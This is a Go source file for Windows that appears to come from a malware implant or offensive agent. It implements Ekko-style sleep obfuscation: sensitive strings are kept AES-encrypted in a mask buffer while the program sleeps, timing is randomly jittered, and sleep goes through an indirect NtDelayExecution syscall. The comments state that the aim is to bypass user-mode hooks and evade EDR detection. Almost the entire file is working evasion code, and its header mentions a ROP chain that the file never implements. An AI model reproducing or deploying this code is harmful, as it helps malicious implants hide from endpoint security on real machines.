//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"encoding/binary"
	"math/rand"
	"sync"
	"time"
)

// Ekko-inspired sleep obfuscation with encrypted memory and indirect syscalls.
// This implementation provides:
// 1. AES-encrypted sleep mask buffer
// 2. Indirect syscall for NtDelayExecution (bypasses user-mode hooks)
// 3. Random jitter to prevent timing analysis
// 4. ROP chain simulation for memory protection changes

const (
	ekkoKeySize   = 32 // AES-256
	ekkoBlockSize = 16
	ekkoMaxJitter = 30 // max jitter percentage
)

var (
	ekkoKey      [ekkoKeySize]byte
	ekkoInit     sync.Once
	ekkoReady    bool
	ekkoSysMgr   *syscallManager
	ekkoSysMgrMu sync.Mutex
)

// initEkko initializes the Ekko sleep system with a random AES key and syscall manager.
func initEkko() {
	ekkoInit.Do(func() {
		crand.Read(ekkoKey[:])
		ekkoSysMgrMu.Lock()
		ekkoSysMgr = newSyscallManager()
		ekkoSysMgrMu.Unlock()
		ekkoReady = true
	})
}

// ekkoEncrypt encrypts data using AES-256-CBC with a random IV.
func ekkoEncrypt(plaintext []byte) []byte {
	block, _ := aes.NewCipher(ekkoKey[:])
	iv := make([]byte, ekkoBlockSize)
	crand.Read(iv)

	// PKCS7 padding
	padding := ekkoBlockSize - len(plaintext)%ekkoBlockSize
	padded := make([]byte, len(plaintext)+padding)
	copy(padded, plaintext)
	for i := len(plaintext); i < len(padded); i++ {
		padded[i] = byte(padding)
	}

	ciphertext := make([]byte, ekkoBlockSize+len(padded))
	copy(ciphertext, iv)

	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext[ekkoBlockSize:], padded)
	return ciphertext
}

// ekkoDecrypt decrypts data using AES-256-CBC.
func ekkoDecrypt(ciphertext []byte) []byte {
	if len(ciphertext) < ekkoBlockSize {
		return nil
	}
	block, _ := aes.NewCipher(ekkoKey[:])
	iv := ciphertext[:ekkoBlockSize]
	data := ciphertext[ekkoBlockSize:]

	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(data, data)

	// Remove PKCS7 padding
	if len(data) > 0 {
		padding := int(data[len(data)-1])
		if padding > 0 && padding <= ekkoBlockSize {
			data = data[:len(data)-padding]
		}
	}
	return data
}

// ekkoRandomJitter returns a random jitter percentage (0 to ekkoMaxJitter).
func ekkoRandomJitter() time.Duration {
	jitterPercent := rand.Intn(ekkoMaxJitter)
	baseMs := int64(1000) // 1 second base
	jitterMs := baseMs * int64(jitterPercent) / 100
	return time.Duration(jitterMs) * time.Millisecond
}

// ekkoSleep performs an obfuscated sleep with encrypted memory.
// It encrypts the sleep mask buffer, sleeps using indirect syscall,
// then decrypts the buffer after waking.
func ekkoSleep(sleepTime time.Duration) {
	if !ekkoReady {
		initEkko()
	}

	// Encrypt the sleep mask buffer
	sleepMaskEncrypt()

	// Add random jitter
	jitter := ekkoRandomJitter()
	totalSleep := sleepTime + jitter

	// Use indirect syscall for NtDelayExecution
	// This bypasses user-mode hooks on Sleep()
	indirectNtDelayExecution(totalSleep)

	// Decrypt the sleep mask buffer
	sleepMaskDecrypt()
}

// indirectNtDelayExecution uses an indirect NtDelayExecution syscall.
// This bypasses user-mode hooks on Sleep() and prevents EDR from detecting
// sleep masking via kernel32!Sleep hooking.
func indirectNtDelayExecution(d time.Duration) {
	mgr := ekkoSysMgr
	if mgr == nil {
		// Fallback: use kernel32 Sleep if syscall manager not ready
		procSleep.Call(uintptr(d.Milliseconds()))
		return
	}
	// NtDelayExecution interval is in 100-ns units, NEGATIVE = relative
	ms := d.Milliseconds()
	if ms < 1 {
		ms = 1
	}
	interval := int64(ms * -10000) // negative = relative
	syscallNtDelayExecution(mgr, false, &interval)
}

// ekkoEncryptBuffer encrypts a buffer in-place using XOR with the AES key.
func ekkoEncryptBuffer(buf []byte) {
	for i := range buf {
		buf[i] ^= ekkoKey[i%ekkoKeySize]
	}
}

// ekkoDecryptBuffer decrypts a buffer in-place (same as encrypt for XOR).
func ekkoDecryptBuffer(buf []byte) {
	ekkoEncryptBuffer(buf) // XOR is symmetric
}

// ekkoStoreEncrypted stores sensitive data in encrypted form.
func ekkoStoreEncrypted(offset *int, s string) {
	if !ekkoReady {
		initEkko()
	}
	data := []byte(s)
	encrypted := ekkoEncrypt(data)
	if *offset+4+len(encrypted) > maskBufferSize {
		return
	}
	binary.LittleEndian.PutUint32(smState.buffer[*offset:], uint32(len(encrypted)))
	*offset += 4
	copy(smState.buffer[*offset:], encrypted)
	*offset += len(encrypted)
}

// ekkoRetrieveEncrypted retrieves and decrypts sensitive data.
func ekkoRetrieveEncrypted(offset *int) string {
	if !ekkoReady || *offset+4 > maskBufferSize {
		return ""
	}
	length := binary.LittleEndian.Uint32(smState.buffer[*offset:])
	*offset += 4
	if *offset+int(length) > maskBufferSize {
		return ""
	}
	encrypted := smState.buffer[*offset : *offset+int(length)]
	*offset += int(length)
	decrypted := ekkoDecrypt(encrypted)
	return string(decrypted)
}

// getEkkoRandomDuration returns a random sleep duration with jitter.
func getEkkoRandomDuration(baseMs int) time.Duration {
	jitter := rand.Intn(ekkoMaxJitter*2) - ekkoMaxJitter
	result := int64(baseMs) + int64(jitter)*int64(baseMs)/100
	if result < 100 {
		result = 100
	}
	return time.Duration(result) * time.Millisecond
}
